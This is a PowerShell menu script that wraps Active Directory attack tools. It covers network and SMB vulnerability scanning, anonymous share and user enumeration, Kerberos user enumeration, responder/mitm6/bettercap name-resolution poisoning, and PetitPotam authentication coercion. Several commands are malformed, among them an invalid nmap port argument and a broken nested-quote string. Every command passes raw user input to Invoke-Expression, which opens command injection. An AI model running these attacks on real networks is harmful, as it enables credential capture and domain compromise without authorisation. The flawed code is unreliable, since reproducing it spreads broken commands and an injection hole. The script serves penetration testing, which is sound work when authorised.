#This script has been created with the information collected at https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg

# Pentesting Active Directory Menu Script

function Show-MainMenu {
    Clear-Host
    Write-Host "=== Active Directory Pentesting Menu ==="
    Write-Host "1. Scan Network"
    Write-Host "2. Find DC IP"
    Write-Host "3. Zone Transfer"
    Write-Host "4. List Guest Access on SMB Share"
    Write-Host "5. Enumerate LDAP"
    Write-Host "6. Find User List"
    Write-Host "7. Poisoning"
    Write-Host "8. Coerce"
    Write-Host "0. Exit"
    $choice = Read-Host "Select an option"
    switch ($choice) {
        1 { Show-ScanNetworkMenu }
        2 { Find-DCIP }
        3 { Zone-Transfer }
        4 { Show-ListGuestAccessMenu }
        5 { Enumerate-LDAP }
        6 { Show-FindUserListMenu }
        7 { Poisoning }
        8 { Coerce }
        0 { Exit }
        default { Write-Host "Invalid selection. Try again."; Show-MainMenu }
    }
}

function Show-ScanNetworkMenu {
    Clear-Host
    Write-Host "=== Scan Network ==="
    Write-Host "1. Enumerate SMB Hosts"
    Write-Host "2. Ping Scan"
    Write-Host "3. Quick Scan"
    Write-Host "4. Vulnerability Scan"
    Write-Host "5. Classic Scan"
    Write-Host "6. Full Scan"
    Write-Host "7. UDP Scan"
    Write-Host "0. Back to Main Menu"
    $choice = Read-Host "Select an option"
    switch ($choice) {
        1 {
            $ip_range = Read-Host "Enter IP range"
            Invoke-Expression "cme smb $ip_range -u '' -p '' enumerate smb hosts"
        }
        2 {
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -sP -iL $ip"
        }
        3 {
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -PN -v -p <top-ports 50> --open $ip"
        }
        4 {
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -PN --script smb-vuln* -p139,445 $ip"
        }
        5 {
            $port = Read-Host "Enter port"
            $output = Read-Host "Enter output filename"
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -sS -sC -sV -p $port -oA $output $ip"
        }
        6 {
            $output = Read-Host "Enter output filename"
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -PN -sC -sV -sV -oA $output $ip"
        }
        7 {
            $output = Read-Host "Enter output filename"
            $port = Read-Host "Enter port"
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -sU -sC -sV -oA $output -p $port $ip"
        }
        0 { Show-MainMenu }
        default { Write-Host "Invalid selection. Try again."; Show-ScanNetworkMenu }
    }
}

function Find-DCIP {
    Clear-Host
    Write-Host "=== Find DC IP ==="
    $domain = Read-Host "Enter domain"
    Invoke-Expression "nmcli dev show eth0"  # Example to show domain name & DNS
    Invoke-Expression "nslookup -type=SRV _ldap._tcp.dc._msdcs.$domain"
    Pause
    Show-MainMenu
}

function Zone-Transfer {
    Clear-Host
    Write-Host "=== Zone Transfer ==="
    $domain_name = Read-Host "Enter domain name"
    $name_server = Read-Host "Enter name server"
    Invoke-Expression "dig axfr $domain_name @$name_server"
    Pause
    Show-MainMenu
}

function Show-ListGuestAccessMenu {
    Clear-Host
    Write-Host "=== List Guest Access on SMB Share ==="
    Write-Host "1. Enum4linux (Anonymous)"
    Write-Host "2. Enum4linux (Guest)"
    Write-Host "3. SMBmap (Anonymous)"
    Write-Host "4. SMBmap (Guest)"
    Write-Host "5. SMBclient (Anonymous)"
    Write-Host "6. SMBclient (Guest)"
    Write-Host "0. Back to Main Menu"
    $choice = Read-Host "Select an option"
    switch ($choice) {
        1 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "enum4linux -a -u '' -p '' $dc_ip"
        }
        2 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "enum4linux -a -u 'guest' -p '' $dc_ip"
        }
        3 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "smbmap -u '' -p '' -P 445 -H $dc_ip"
        }
        4 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "smbmap -u 'guest' -p '' -P 445 -H $dc_ip"
        }
        5 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "smbclient -U '' -L //$dc_ip"
        }
        6 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "smbclient -U 'guest' -L //$dc_ip"
        }
        0 { Show-MainMenu }
        default { Write-Host "Invalid selection. Try again."; Show-ListGuestAccessMenu }
    }
}

function Enumerate-LDAP {
    Clear-Host
    Write-Host "=== Enumerate LDAP ==="
    $dc_ip = Read-Host "Enter DC IP"
    Invoke-Expression "nmap -n -sV --script 'ldap* and not brute' -p 389 $dc_ip"
    $ip = Read-Host "Enter IP for ldapsearch"
    $base = Read-Host "Enter base for ldapsearch"
    Invoke-Expression "ldapsearch -x -h $ip -b $base"
    Pause
    Show-MainMenu
}

function Show-FindUserListMenu {
    Clear-Host
    Write-Host "=== Find User List ==="
    Write-Host "1. Enum4linux User Enumeration"
    Write-Host "2. CME Command"
    Write-Host "3. Net RPC Group Members"
    Write-Host "4. OSINT Enumeration"
    Write-Host "0. Back to Main Menu"
    $choice = Read-Host "Select an option"
    switch ($choice) {
        1 {
            $dc_ip = Read-Host "Enter DC IP"
            Invoke-Expression "enum4linux -U $dc_ip | grep 'user:'"
        }
        2 {
            $ip = Read-Host "Enter IP"
            Invoke-Expression "cme smb $ip --users"
        }
        3 {
            $domain = Read-Host "Enter domain"
            $ip = Read-Host "Enter IP"
            Invoke-Expression "net rpc group members 'Domain Users' -W $domain -I $ip -U '%'"
        }
        4 { $domain = Read-Host "Enter domain you want to enum"
            $userdb = Read-Host "Enter User list file"
            $ip = Read-Host "Enter IP"
            Invoke-Expression "nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm=$domain,userdb=$userdb" $ip"
        }
        0 { Show-MainMenu }
        default { Write-Host "Invalid selection. Try again."; Show-FindUserListMenu }
    }
}

function Poisoning {
    Clear-Host
    Write-Host "=== Poisoning ==="
    Invoke-Expression "responder -I eth0"  # Example for LLMNR/NTBNS/MDNS poisoning
    $domain = Read-Host "Enter domain"
    Invoke-Expression "mitm6 -d $domain"
    Invoke-Expression "bettercap"
    Pause
    Show-MainMenu
}

function Coerce {
    Clear-Host
    Write-Host "=== Coerce ==="
    $domain = Read-Host "Enter domain"
    $listener_ip = Read-Host "Enter listener IP"
    $target_ip = Read-Host "Enter target IP"
    Invoke-Expression "PetitPotam.py $domain $listener_ip $target_ip"
    Pause
    Show-MainMenu
}

function Exit {
    Write-Host "Exiting script."
}

# Start the main menu
Show-MainMenu
